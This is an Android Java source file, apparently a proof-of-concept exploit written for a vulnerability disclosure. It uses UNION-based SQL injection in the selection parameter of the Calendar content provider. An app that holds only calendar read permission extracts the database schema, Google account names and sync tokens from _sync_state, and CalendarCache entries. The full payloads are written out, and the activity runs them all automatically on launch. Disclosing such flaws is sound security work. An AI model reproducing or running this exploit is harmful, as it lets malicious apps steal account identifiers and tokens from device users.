package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class CalendarSqliActivity extends Activity {
    private static final String TAG = "CalendarSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("CalendarProvider SQL Injection PoC\nUID: " + android.os.Process.myUid() + "\nPackage: " + getPackageName() + "\n\n");

        Button btnSchema = new Button(this);
        btnSchema.setText("1: Extract DB Schema (sqlite_master)");
        btnSchema.setOnClickListener(v -> extractSchema());

        Button btnSync = new Button(this);
        btnSync.setText("2: Extract _sync_state (account tokens)");
        btnSync.setOnClickListener(v -> extractSyncState());

        Button btnCache = new Button(this);
        btnCache.setText("3: Extract CalendarCache");
        btnCache.setOnClickListener(v -> extractCalendarCache());

        Button btnAll = new Button(this);
        btnAll.setText("RUN ALL SQLi TESTS");
        btnAll.setOnClickListener(v -> {
            extractSchema();
            extractSyncState();
            extractCalendarCache();
        });

        layout.addView(btnAll);
        layout.addView(btnSchema);
        layout.addView(btnSync);
        layout.addView(btnCache);
        layout.addView(logView);
        scrollView.addView(layout);
        setContentView(scrollView);

        log("Ready. App has READ_CALENDAR permission only.");
        log("Attack: UNION-based SQL injection via selection parameter");
        log("Target: content://com.android.calendar/calendars\n");

        extractSchema();
        extractSyncState();
        extractCalendarCache();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void extractSchema() {
        log("=== TEST 1: Extracting sqlite_master schema ===");
        log("Payload: UNION SELECT sql FROM sqlite_master WHERE type='table'");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM sqlite_master WHERE type='table'--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from sqlite_master");
                int tableCount = 0;
                while (cursor.moveToNext()) {
                    String schema = cursor.getString(0);
                    if (schema != null && !schema.isEmpty()) {
                        tableCount++;
                        log("TABLE[" + tableCount + "]: " + schema);
                    }
                }
                cursor.close();
                log("Total tables extracted: " + tableCount);
                log("IMPACT: App with READ_CALENDAR accessed internal DB schema");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void extractSyncState() {
        log("=== TEST 2: Extracting _sync_state (account + sync tokens) ===");
        log("Payload: UNION SELECT account_name||'|'||account_type||'|'||data FROM _sync_state");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT account_name||'|'||account_type||'|'||data,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM _sync_state--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from _sync_state");
                while (cursor.moveToNext()) {
                    String data = cursor.getString(0);
                    if (data != null && !data.isEmpty()) {
                        log("SYNC_STATE: " + data);
                    }
                }
                cursor.close();
                log("IMPACT: Extracted Google account emails and sync tokens via SQLi");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void extractCalendarCache() {
        log("=== TEST 3: Extracting CalendarCache ===");
        log("Payload: UNION SELECT key||'='||value FROM CalendarCache");
        try {
            Uri uri = Uri.parse("content://com.android.calendar/calendars");
            String selection = "1=0) UNION SELECT key||'='||value,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM CalendarCache--";
            Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
            if (cursor != null) {
                log("SUCCESS: Got " + cursor.getCount() + " rows from CalendarCache");
                while (cursor.moveToNext()) {
                    String data = cursor.getString(0);
                    if (data != null && !data.isEmpty()) {
                        log("CACHE: " + data);
                    }
                }
                cursor.close();
                log("IMPACT: Extracted internal cache data not accessible via Calendar API");
            } else {
                log("FAILED: cursor is null");
            }
        } catch (Exception e) {
            log("ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }
}
